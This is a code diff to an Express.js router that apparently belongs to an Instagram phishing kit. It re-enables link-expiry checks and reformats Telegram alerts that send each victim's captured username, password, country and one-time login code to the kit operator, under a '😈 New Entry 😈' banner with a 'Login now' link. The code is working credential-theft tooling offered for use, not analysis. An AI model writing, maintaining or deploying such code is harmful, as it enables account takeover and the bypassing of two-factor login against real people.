@@ -12,9 +12,9 @@ router.get("/inst/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
         if (linkId.length !== 24 || !link || link.linkType !== 'INSTAGRAM') {
             return res.redirect("/notfound");
         }
@@ -31,9 +31,9 @@ router.get("/inst/otp/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
         if (linkId.length !== 24 || !link || link.linkType !== 'INSTAGRAM') {
             return res.redirect("/notfound");
         }
@@ -68,12 +68,12 @@ router.post("/inst/:linkId", async (req, res) => {
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
                 😈 New Entry 😈
-INSTAGRAM
+SOCIAL MEDIA: INSTAGRAM
+
 LOCATION: ${country}
 
-username: ${username}
-pasword: ${password}
-
+USERNAME: ${username}
+PASSWORD: ${password}
 OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
 
 Login now: https://www.instagram.com
@@ -105,7 +105,8 @@ router.post("/inst/otp/:linkId", async (req, res) => {
         if (link) {
             await bot.sendMessage(user.telegramID, `
 😈 NEW ENTRY 😈
-INSTAGRAM
+
+SOCIAL MEDIA: INSTAGRAM
 
 OTP: ${code}
 
